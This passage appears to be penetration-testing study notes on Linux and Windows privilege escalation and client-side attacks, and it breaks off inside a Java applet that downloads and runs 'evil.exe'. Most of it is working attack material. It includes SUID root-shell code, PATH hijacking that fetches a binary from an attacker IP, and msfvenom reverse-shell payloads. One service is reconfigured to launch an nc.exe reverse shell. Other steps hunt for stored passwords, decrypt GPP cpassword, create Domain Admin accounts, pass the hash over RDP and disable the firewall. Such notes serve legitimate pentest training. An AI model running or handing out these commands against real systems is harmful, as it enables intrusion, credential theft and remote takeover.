<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo -l
sudo su -
</code></pre></div><p>Are you part of the sudo group, but not in the sudoers file?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">id <span style="color:#75715e"># 27(sudo)</span>
pkexec sh
</code></pre></div><p>No TTY or PTY, non-interactive? (&ldquo;no tty present and no askpass program specified&rdquo;) Spawn one:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Errors about missing files while compiling with gcc? (&ldquo;gcc: error trying to exec &lsquo;cc1&rsquo;: execvp: No such file or directory&rdquo;) Export PATH:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">export PATH<span style="color:#f92672">=</span>$PATH
</code></pre></div><p>Resources:</p>
<ul>
<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
<li><a href="https://payatu.com/guide-linux-privilege-escalation/">https://payatu.com/guide-linux-privilege-escalation/</a></li>
<li><a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm</a>
<ul>
<li>Shell Escape Sequences
<ul>
<li><code>vi</code></li>
<li><code>emacs</code></li>
<li><code>find</code></li>
<li><code>awk</code></li>
<li><code>perl</code></li>
<li><code>man</code></li>
<li><code>nmap</code></li>
</ul>
</li>
<li>IFS Exploit</li>
<li>LD_PRELOAD Exploit</li>
<li>Abusing users with <code>.</code> in their PATH (requires interaction)</li>
<li>Symlinks (requires interaction)</li>
</ul>
</li>
<li><a href="https://www.pentestpartners.com/security-blog/exploiting-suid-executables/">https://www.pentestpartners.com/security-blog/exploiting-suid-executables/</a>
<ul>
<li>Simple PATH SUID Privilege Escalation</li>
</ul>
</li>
<li><a href="https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa">https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa</a>
<ul>
<li>SUID is ignored on all interpreted (shebang <code>#!</code>) executables</li>
</ul>
</li>
</ul>
<p>Tools:</p>
<ul>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li>
<li><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
</ul>
<h4 id="suid-privilege-escalation">SUID Privilege Escalation</h4>
<p>Note: <code>setuid</code> bit simply allows a script to set the <code>uid</code>. The script still needs to call <code>setuid()</code> or <code>setreuid()</code> to run in the the real uid or effective uid respectively. Without calling <code>setuid()</code> or <code>setreuid()</code>, the script will still run as the user who invoked the script: <a href="https://stackoverflow.com/a/20687988/4908573">https://stackoverflow.com/a/20687988/4908573</a></p>
<p>Ensure to use &ldquo;PrependSetuid=true&rdquo; when generating a binary that is going to be directly used in SUID privilege escalation:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p linux/x86/exec cmd<span style="color:#f92672">=</span>/bin/bash PrependSetuid<span style="color:#f92672">=</span>true -f elf -o shell
</code></pre></div><p>Resources:</p>
<ul>
<li><a href="https://twitter.com/mubix/status/2049242113777664">https://twitter.com/mubix/status/2049242113777664</a></li>
<li><a href="http://linux4dummy.blogspot.sg/2012/05/creating-basic-backdoor-for-linux.html">http://linux4dummy.blogspot.sg/2012/05/creating-basic-backdoor-for-linux.html</a></li>
</ul>
<p>Or instead of using an &ldquo;exec&rdquo; binary to give you a shell, manually setuid in C, compile, run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo -e <span style="color:#e6db74">&#39;#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem(&#34;/bin/bash&#34;);\n}&#39;</span> &gt; setuid.c
sudo chown root:root /tmp/setuid
sudo chmod <span style="color:#ae81ff">4755</span> /tmp/setuid
/tmp/setuid
</code></pre></div><h5 id="simple-path-suid-privilege-escalation">Simple PATH SUID Privilege Escalation</h5>
<pre><code># On Victim
bob@sufferance:~$ ls -l /usr/local/bin/uploadtosecure
-rwsr-xr-x 1 root root 6923 2008-10-07 19:38 /usr/local/bin/uploadtosecure
bob@sufferance:~$ strings /usr/local/bin/uploadtosecure
puts
system
...
Archiving files to secure server...
scp -r file/tobesecured/* 10.192.168.1.23:/var/www/html/files/

# On Kali
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp

# On Victim
wget 192.168.1.23/scp -O /tmp/scp # transfer the exec binary over to Sufferance
chmod 755 /tmp/scp
export PATH=/tmp:$PATH
/usr/local/bin/uploadtosecure # it'll now call our &quot;special&quot; scp binary in /tmp instead
whoami
</code></pre><h5 id="bypass-absolute-binary-paths-with-ifs">Bypass Absolute Binary Paths with IFS</h5>
<p>If the binary being called is absolute (eg. <code>/usr/bin/scp</code>), you can export <code>IFS=/</code>. The SUID binary will now execute <code>usr bin scp</code>. Drop a <code>usr</code> binary into <code>/tmp</code> and add it to PATH.</p>
<h3 id="windows-configuration-issues">Windows Configuration Issues</h3>
<p>Great Resources:</p>
<ul>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li>And more listed in the examples below</li>
</ul>
<h4 id="weak-service-permissions">Weak Service Permissions</h4>
<p>NOTE: Hi-priv shell sessions that are created through weak services will die quickly, like in 20-30 sec, make sure to migrate (Meterpreter) to a new process, or start a create a new process by opening another shell with nc.exe</p>
<h5 id="insecure-filefolder-permissions-with-wmic-and-icacls">Insecure File/Folder Permissions with <code>wmic</code> and <code>icacls</code></h5>
<p>Use <code>icacls [.exe]</code> to check for insecure permissions such as <code>Everyone:(I)(F)</code> within service executables (within <code>services.msc</code>), and then with a non-privileged user, replace that file with a malicious file.</p>
<p>Automatically find weak service file permissions with the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">for</span> <span style="color:#66d9ef">/f</span> <span style="color:#e6db74">&#34;tokens=2 delims=&#39;=&#39;&#34;</span> %a in (&#39;wmic service list full^|find /i &#34;pathname&#34;^|find /i /v &#34;system32&#34;&#39;) do @echo %a &gt;&gt; services.txt
for /f eol<span style="color:#ae81ff">^=^&#34;^ </span>delims<span style="color:#ae81ff">^=^&#34;</span> %a in (services.txt) do cmd.exe /c icacls &#34;%a<span style="color:#e6db74">&#34; &gt;&gt; permissions.txt</span>
# look for `Everyone:(...)(F)`, `BUILTIN\Users:(...)(F)`, `NT AUTHORITY\Authenticated Users:(...)(M)`, `NT AUTHORITY\Authenticated Users:(...)(C)`, `[Computer]\[Your User]:(...)(F)` in permissions.txt. transfer it out to kali if needed, as it it&#39;ll be easier to search
</code></pre></div><p>Upload a reverse shell executable and replace the original service executable with the malicious one with <code>copy useradd.exe C:\the\path\to\service\binary.exe</code>. The next time the service is started, the malicious executable will run with SYSTEM privileges.</p>
<p>Tools:</p>
<ul>
<li><code>icacls</code></li>
</ul>
<p>Alternatively, make the current low-priv user an Administrator. Prepare a malicious executable to give bob administrative rights on Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
  <span style="color:#66d9ef">int</span> i;
  i <span style="color:#f92672">=</span> system(<span style="color:#e6db74">&#34;net localgroup administrators bob /add&#34;</span>);
  <span style="color:#66d9ef">return</span> i;
}
</code></pre></div><p>Compile it to an executable using mingw32: <code>i686-w64-mingw32-gcc -o useradd.exe useradd.c</code></p>
<p>Resources:</p>
<ul>
<li><a href="http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/">http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/</a></li>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
</ul>
<h5 id="insecure-service-permissions-with-accesschkexe-and-sc">Insecure Service Permissions with <code>accesschk.exe</code> and <code>sc</code></h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">accesschk.exe -accepteula
accesschk.exe -uwcqv <span style="color:#e6db74">&#34;Everyone&#34;</span> *
accesschk.exe -uwcqv <span style="color:#e6db74">&#34;Authenticated Users&#34;</span> *
accesschk.exe -uwcqv <span style="color:#e6db74">&#34;Users&#34;</span> *
# find a service that returns `SERVICE_ALL_ACCESS`.
sc qc Apache # query the service to check whether it runs as system, it&#39;s binary path, etc.
sc config Apache binPath= <span style="color:#e6db74">&#34;C:\Windows\TEMP\nc.exe 192.168.1.23 4444 -e cmd.exe&#34;</span> # or <span style="color:#e6db74">&#34;net localgroup administrators bob /add&#34;</span>
sc config Apache obj= <span style="color:#e6db74">&#34;.\LocalSystem&#34;</span> password= <span style="color:#e6db74">&#34;&#34;</span> # this makes the service run as SYSTEM. do this for services that has smth other than LocalSystem in SERVICE_START_NAME
sc config Apache start= demand # this allows a service to be started. do this if a service is disabled
# restart service
</code></pre></div><p>Windows XP SP0 &amp; SP1 UPNP (upnphost) and SSDP Discovery (ssdpsrv) Services have insecure service permission. They allow &ldquo;Authenticated Users&rdquo; to modify the services. It can be used as a universal local privilege escalation vulnerability. Note, upnphost requires ssdpsrv to start first.</p>
<p>Tools:</p>
<ul>
<li><code>accesschk.exe</code></li>
<li><code>sc</code></li>
<li>Metasploit Module: <code>exploit/windows/local/service_permissions</code></li>
</ul>
<p>Resources:</p>
<ul>
<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
<li><a href="https://pentestlab.blog/2017/03/30/weak-service-permissions/">https://pentestlab.blog/2017/03/30/weak-service-permissions/</a></li>
<li><a href="https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li>
<li>Enable a disabled service with sc, other options here as well: <a href="http://www.itprotoday.com/management-mobility/how-can-i-configure-services-start-type-command-line">http://www.itprotoday.com/management-mobility/how-can-i-configure-services-start-type-command-line</a></li>
<li>UPNP (upnphost) requires SSDP Discovery (ssdpsrv) to start: <a href="https://www.pcreview.co.uk/threads/upnp-service-not-starting.2694748/">https://www.pcreview.co.uk/threads/upnp-service-not-starting.2694748/</a></li>
<li>SSDP Discovery service name is ssdpsrv: <a href="https://computerstepbystep.com/ssdp_discovery_service.html">https://computerstepbystep.com/ssdp_discovery_service.html</a></li>
</ul>
<h5 id="unquoted-services">Unquoted Services</h5>
<p>Find services that are unquoted:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">wmic service get name,displayname,pathname,startmode |findstr /i <span style="color:#e6db74">&#34;Auto&#34;</span> |findstr /i /v <span style="color:#e6db74">&#34;C:\Windows\\&#34;</span> |findstr /i /v <span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>When Windows attempts to run these services, it will look at the following paths in order and run the first executable that it finds. Just imagine splitting the string with a space:</p>
<pre><code># C:\Program Files (x86)\Program Folder\A Subfolder\Another Subfolder\Executable.exe
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Another.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Another Subfolder\Executable.exe
</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">icacls <span style="color:#e6db74">&#34;C:\Program Files (x86)\Program Folder\A Subfolder&#34;</span>
# look for `Everyone:(...)(F)`, `BUILTIN\Users:(...)(F)`, `NT AUTHORITY\Authenticated Users:(...)(M)`, `NT AUTHORITY\Authenticated Users:(...)(C)`, or `[Computer]\[Your User]:(...)(F)` to check if you are able to write that directory
# drop a malicious executable at <span style="color:#e6db74">&#34;C:\Program Files (x86)\Program Folder\A Subfolder\Another.exe&#34;</span> that spawns a shell
# restart service
</code></pre></div><p>Tools:</p>
<ul>
<li><code>wmic service</code></li>
<li><code>icacls</code></li>
<li>Metasploit Module: <code>exploit/windows/local/trusted_service_path</code></li>
</ul>
<p>Reference:</p>
<ul>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
</ul>
<h4 id="alwaysinstallelevated">AlwaysInstallElevated</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"># On Windows:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# if key is found, the following is produced:
# HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
#    AlwaysInstallElevated    REG_DWORD    0x1
# if not found:
# ERROR: The system was unable to find the specified registry key or value.

# On Kali, generate a msi that will call a reverse shell
msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=[kali ip] LPORT=[port] -f exe -o payload.exe
msfvenom -p windows/exec cmd=<span style="color:#e6db74">&#34;C:\Users\bob\AppData\Local\Temp\Payload.exe&#34;</span> -f msi-nouac -o shell.msi
# transfer both to <span style="color:#e6db74">&#34;C:\Users\bob\AppData\Local\Temp\&#34;</span>

# On Windows:
msiexec /quiet /qn /i <span style="color:#e6db74">&#34;C:\Users\bob\AppData\Local\Temp\malicious.msi&#34;</span> # /quiet - Suppress messages to the user, /qn - no gui, /i - regular (vs administrative) installation
</code></pre></div><p>Tools:</p>
<ul>
<li>Metasploit Module: <code>exploit/windows/local/always_install_elevated</code></li>
</ul>
<p>Resources:</p>
<ul>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
</ul>
<h4 id="dll-hijacking">DLL Hijacking</h4>
<p>Order in which Windows finds a DLL:</p>
<ol>
<li>The directory from which the application loaded</li>
<li>32-bit System directory (C:\Windows\System32)</li>
<li>16-bit System directory (C:\Windows\System)</li>
<li>Windows directory (C:\Windows)</li>
<li>The current working directory (CWD)</li>
<li>Directories in the PATH environment variable (system then user)</li>
</ol>
<p>Sometimes, a DLL does not exist on the machine. As a low privilege user we have little hope of putting a malicious DLL in 1-4, 5 is not a possibility in this case because we are talking about a Windows service but if we have write access to any of the directories in the Windows PATH we win.</p>
<p>We&rsquo;ll need 2 things, a writable file/folder in %PATH% (&ldquo;C:\Python27&rdquo;), and a vulnerable service/application that has missing DLLs (IKEEXT):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">echo</span> %path%
# Find a non-default directory in <span style="color:#e6db74">&#34;C:\&#34;</span>, it will give write access to authenticated users.
cacls <span style="color:#e6db74">&#34;C:\Python27&#34;</span>
msfvenom -p windows/shell_reverse_tcp lhost=[kali ip] lport=[port] -f dll -o shell.dll # on Kali
<span style="color:#66d9ef">copy</span> shell.dll C:\Python27\wlbsctrl.dll
# restart IKEEXT service
</code></pre></div><p>Resources:</p>
<ul>
<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li>ExploitDB: <a href="https://www.exploit-db.com/dll-hijacking-vulnerable-applications/">https://www.exploit-db.com/dll-hijacking-vulnerable-applications/</a></li>
<li><code>searchsploit [program] dll</code>. Find ones that has &ldquo;DLL Hijacking&rdquo; in the name</li>
</ul>
<h4 id="task-scheduler-weak-filefolder-permissions">Task Scheduler Weak File/Folder Permissions</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">schtasks /query /fo LIST /v
# Look at the <span style="color:#e6db74">&#34;Task To Run&#34;</span> within the task list. Eg: E:\GrabLogs\tftp.exe 10.1.1.99 GET ...
cacls <span style="color:#e6db74">&#34;E:\GrabLogs&#34;</span>
# If Authenticated Users or Users or equivalent has modify permissions, simply replace the binary within with a reverse shell
<span style="color:#66d9ef">copy</span> shell.exe E:\GrabLogs\tftp.exe
</code></pre></div><h4 id="stored-credentials">Stored Credentials</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">dir</span> c:\*pass*.txt /s /b
<span style="color:#66d9ef">dir</span> c:\*vnc.ini /s /b /c
<span style="color:#66d9ef">dir</span> c:\*ultravnc.ini /s /b /c
<span style="color:#66d9ef">dir</span> c:\ /s /b /c | findstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
<span style="color:#66d9ef">type</span> C:\unattend.xml
<span style="color:#66d9ef">type</span> C:\sysprep.inf
<span style="color:#66d9ef">type</span> C:\sysprep\sysprep.xml
</code></pre></div><p>Retrieving credentials stored within GPP files from Domain Controller:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">net use z: \\dc01\SYSVOL # whr dc01 is the Domain Controller
<span style="color:#66d9ef">cd</span> C:\Windows\SYSVOL # or cd in, if you are the Domain Controller already
<span style="color:#66d9ef">dir</span> /s Groups.xml
findstr -si cpassword C:\..\Groups.xml
# within Groups.xml file, find <span style="color:#e6db74">&#34;cpassword&#34;</span>, then gpp-decrypt them on kali
</code></pre></div><h4 id="administrator-to-system-not-required-not-an-issue">Administrator to SYSTEM (Not Required) (Not an Issue)</h4>
<h5 id="task-scheduler">Task Scheduler</h5>
<p>This method only works on a Windows 2000, XP, or 2003 machine. And this requires local administrator access. Creates a high-priv shell using task scheduler.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">time</span>
# set the following to 1min after current time
at 01:23 /interactive <span style="color:#e6db74">&#34;C:\shell.exe&#34;</span> # to open reverse shell
at 01:23 /interactive cmd.exe # to open cmd with System privileges, only works when you have GUI
</code></pre></div><p>Resources:</p>
<ul>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
</ul>
<h6 id="reconfigure-a-service">Reconfigure a Service</h6>
<p>Refer to Insecure Service Permissions.</p>
<h4 id="useful-cmd-commands">Useful Cmd Commands</h4>
<p>Restarting a Windows service methods:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">sc query Apache # check service status

sc stop Apache &amp;&amp; sc start Apache
net stop Apache &amp;&amp; net start Apache
wmic service Apache call startservice
shutdown /r /t 0 # last resort, reboot, or just wait for user to reboot
</code></pre></div><p>Preparation of adding a non-privileged user and allowing remote desktop connection:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">net user bob bob /add
net localgroup <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span> bob /add
# runas /user:bob cmd.exe # to use a shell instead of remote connection
</code></pre></div><p>Adding user to local administrators group:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">net localgroup administrators bob /add
</code></pre></div><p>Creating a Domain Admin user and login to other servers within the domain. By default, Domain Admins group is part of every server&rsquo;s local Administrator group within the domain.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">net user testing 1qwer$#@! /add /domain
net group <span style="color:#e6db74">&#34;Domain Admins&#34;</span> testing /add /domain
# rdesktop -u &#39;[domain]\testing&#39; -p &#39;1qwer$#@!&#39; [ip of server part of domain] # on kali
# Start &gt; Right-Click Command Prompt &gt; Run as Administrator # Even as a domain admin, you&#39;ll have to manually open cmd as admin because of UAC. (https://blogs.msdn.microsoft.com/patricka/2010/05/13/if-im-an-administrator-why-do-i-get-access-denied/)
</code></pre></div><p>Connecting using RDP (TCP Port 3389) on Kali. Do note, if password is wrong, <code>xfreerdp</code> will return error code <code>0x20009</code>, note if password is correct however server disables local logins, <code>xfreerdp</code> will open the session, but within the session, it&rsquo;ll say &ldquo;The user name or password is incorrect&rdquo;. Meaning that your passwords may be correct, even if RDP isn&rsquo;t allowed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rdesktop -u Administrator -p abc123 192.168.1.23
rdesktop -u <span style="color:#e6db74">&#39;thinc\testing&#39;</span> -p <span style="color:#e6db74">&#39;1qwer$#@!&#39;</span> 192.168.1.23 <span style="color:#75715e"># where thinc is the domain. if thinc doesn&#39;t work, try thinc.local</span>
xfreerdp /u:testing /d:thinc /p:<span style="color:#e6db74">&#39;1qwer$#@!&#39;</span> /v:192.168.1.23
xfreerdp /u:testing /d:thinc /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:192.168.1.23 <span style="color:#75715e"># PTH method</span>
</code></pre></div><p>Checking firewall rules:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"># Deprecated firewall command
netsh firewall set opmode mode=disable exceptions=disable # disable firewall, requires priv

# Newer advfirewall
netsh advfirewall set currentprofile state off # disable firewall, requires priv
netsh advfirewall firewall show rule name=all | find <span style="color:#e6db74">&#34;Rule Name:&#34;</span> | find <span style="color:#e6db74">&#34;NameLookingFor&#34;</span> # search for a rule
</code></pre></div><p>Finding a file</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">dir</span> /s proof.txt # /s recursive
<span style="color:#66d9ef">dir</span> /s /a proof.txt # /s recursive, /a attributes (show all hidden and system files as well)
</code></pre></div><p>Finding strings</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">findstr /i <span style="color:#e6db74">&#34;hello&#34;</span> filename # /i for ignore case
findstr /si <span style="color:#e6db74">&#34;hello&#34;</span> # /i for ignore case, /s for recursive
</code></pre></div><p>Opening a file in notepad (requires GUI):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">start</span> notepad filename
</code></pre></div><p>Shortnames when changing directories or during directory path traversal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"># C:\Program Files\A Pro Gram\
# 6 first chars + ~1
<span style="color:#66d9ef">cd</span> C:\PROGRA~1\APROGR~1\
</code></pre></div><p>Finding Windows version with only hard drive access:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">type</span> C:\Windows\System32\eula.txt
</code></pre></div><h1 id="client-side-attacks">Client Side Attacks</h1>
<h2 id="know-your-target">Know Your Target</h2>
<h3 id="passive-client-information-gathering">Passive Client Information Gathering</h3>
<p>Find information online about the target, such as browser version from websites that collect user agent data.</p>
<h3 id="active-client-information-gathering">Active Client Information Gathering</h3>
<p>Social engineering, calling the company as a support technician in an attempt to extract useful information from the person on the other side of the line. Or sending them an email, with hope for a response or a link click, that would enumerate the user&rsquo;s browser version and installed extensions.</p>
<h2 id="ms12-037---internet-explorer-8-fixed-col-span-id">MS12-037 - Internet Explorer 8 Fixed Col Span ID</h2>
<p><a href="https://www.exploit-db.com/exploits/24017/">https://www.exploit-db.com/exploits/24017/</a></p>
<p>Host the malicious page and visit it. Bind shell open on port 4444.</p>
<p>To swap out shellcode, ensure the new shellcode is of the same size as the exploit apparently bypasses ASLR and DEP, and it also mentions it will be more reliable if it was the same size.</p>
<p>For that, generate the following Windows reverse shell, in Javascript unicode format, with no encoding:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=[</span>kali ip<span style="color:#f92672">]</span> LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f js_le -e generic/none
</code></pre></div><p>Since the payload is 18 bytes smaller, pad it with 18 NOPs: <code>%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090</code></p>
<h2 id="java-signed-applet-attack">Java Signed Applet Attack</h2>
<p>Java.java</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">import</span> java.applet.*<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.awt.*<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.io.*<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.net.URL<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.util.*<span style="color:#f92672">;</span>

<span style="color:#75715e">/**
</span><span style="color:#75715e"> * Author: Offensive Security
</span><span style="color:#75715e"> * This Java applet will download a file and execute it.
</span><span style="color:#75715e"> **/</span>

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Java</span> <span style="color:#66d9ef">extends</span> Applet <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">private</span> Object initialized <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">isInitialized</span><span style="color:#f92672">()</span>
    <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">return</span> initialized<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
        Process f<span style="color:#f92672">;</span>
        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
            String tmpdir <span style="color:#f92672">=</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.io.tmpdir&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> File<span style="color:#f92672">.</span><span style="color:#a6e22e">separator</span><span style="color:#f92672">;</span>
            String expath <span style="color:#f92672">=</span> tmpdir <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;evil.exe&#34;</span><span style="color:#f92672">;</span>
            String download <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
